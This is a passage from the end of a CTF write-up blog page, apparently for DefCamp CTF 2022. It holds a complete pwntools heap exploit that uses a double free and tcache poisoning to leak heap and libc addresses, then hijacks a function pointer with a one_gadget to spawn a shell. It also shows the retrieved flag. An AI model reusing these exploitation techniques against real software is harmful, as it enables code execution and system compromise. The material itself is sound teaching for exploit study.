</span></span><span class="line"><span class="cl">flag.txt  ld-2.27.so  libc.so.6  real_flag.txt    vuln  vuln.c
</span></span><span class="line"><span class="cl">$ cat real_flag.txt
</span></span><span class="line"><span class="cl">CTF<span class="o">{</span>ab7bdaa3e5ed17ed326fef624a2d95d6ea62caa3dba6d1e5493936c362eed40e<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: CTF{ab7bdaa3e5ed17ed326fef624a2d95d6ea62caa3dba6d1e5493936c362eed40e}</p></blockquote>
<h3 id="full-solution">Full Solution</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">1 malloc(admin)
</span></span></span><span class="line"><span class="cl"><span class="s1">2 malloc(student)
</span></span></span><span class="line"><span class="cl"><span class="s1">3 call admin[1]
</span></span></span><span class="line"><span class="cl"><span class="s1">4 edit student
</span></span></span><span class="line"><span class="cl"><span class="s1">5 print student
</span></span></span><span class="line"><span class="cl"><span class="s1">6 free admin
</span></span></span><span class="line"><span class="cl"><span class="s1">7 free student
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln_patched&#39;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{})</span>
</span></span><span class="line"><span class="cl"><span class="c1"># r = remote(&#39;34.159.7.96&#39;, 32552)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">print_student</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;is &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">new_admin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free_admin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_shell</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">new_student</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_student</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free_student</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;7&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Leak heap address by double-free</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span> <span class="c1"># Double free</span>
</span></span><span class="line"><span class="cl">    <span class="n">free_student</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">print_student</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leak heap address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set tcache[0x20] to empty</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_student</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="c1"># Make the current tcache_entry-&gt;next to null</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># The malloc will use the cached chunk, and because the next is null, tcache[0x20] is now empty</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Populate heap because we will forge the chunk to 0x90 size (1 alloc = 0x20 bytes)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Make sure the next of our forged chunk is not the wilderness</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">new_student</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Free the last chunk</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite it with our desired address (heap_address + 0x30)</span>
</span></span><span class="line"><span class="cl"><span class="n">free_student</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_student</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_address</span><span class="o">+</span><span class="mh">0x30</span><span class="p">))</span> <span class="c1"># tcache[0x20] = last_chunk-&gt;heap_address+0x30</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Allocate it to last chunk. Now, tcache[0x20] = heap_address+0x30</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Allocate it to heap_address+0x30. Now, tcache[0x20] = empty and student pointer point to heap_address+0x30</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">free_student</span><span class="p">()</span> <span class="c1"># Free it 7 times to fulfill tcache[0x90]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Because tcache[0x90] is full, the next free will put the cached chunk into unsorted bins</span>
</span></span><span class="line"><span class="cl"><span class="n">free_student</span><span class="p">()</span> <span class="c1"># Cache goes to unsorted bins, and its pointer will point to the main_arena</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now our pointer is pointing to the main_arena. We can leak the libc address by using the print menu,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># because the student variable is still a pointer to the freed chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">print_student</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">main_arena</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_leaked</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="c1"># We got main_arena+0x60</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leaked</span> <span class="o">-</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="mh">0x60</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leak libc base address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_shell</span> <span class="o">=</span> <span class="mh">0x10a38c</span> <span class="c1"># one_gadget</span>
</span></span><span class="line"><span class="cl"><span class="n">shell_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_shell</span>
</span></span><span class="line"><span class="cl"><span class="n">new_admin</span><span class="p">()</span> <span class="c1"># Create new admin</span>
</span></span><span class="line"><span class="cl"><span class="n">free_admin</span><span class="p">()</span> <span class="c1"># Free it</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">shell_addr</span><span class="p">))</span> <span class="c1"># Create new student</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Because of the tcache, now variable admin and student are pointing to the same chunk,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and the chunk data (last 8 bytes) that can be called by the admin is our shell_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">get_shell</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/defcamp-ctf-2022/" data-title="DefCamp CTF 2022" data-via="Chovid99" data-hashtags="Writeup,DefCampCTF,heap,pwn,web,flask,2022"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/defcamp-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/defcampctf/">DefCampCTF</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/flask/">Flask</a>,&nbsp;<a href="/tags/2022/">2022</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/dicectf-2022/" class="prev" rel="prev" title="DiceCTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>DiceCTF 2022</a>
            <a href="/posts/pragyan-ctf-2022/" class="next" rel="next" title="Pragyan CTF 2022">Pragyan CTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
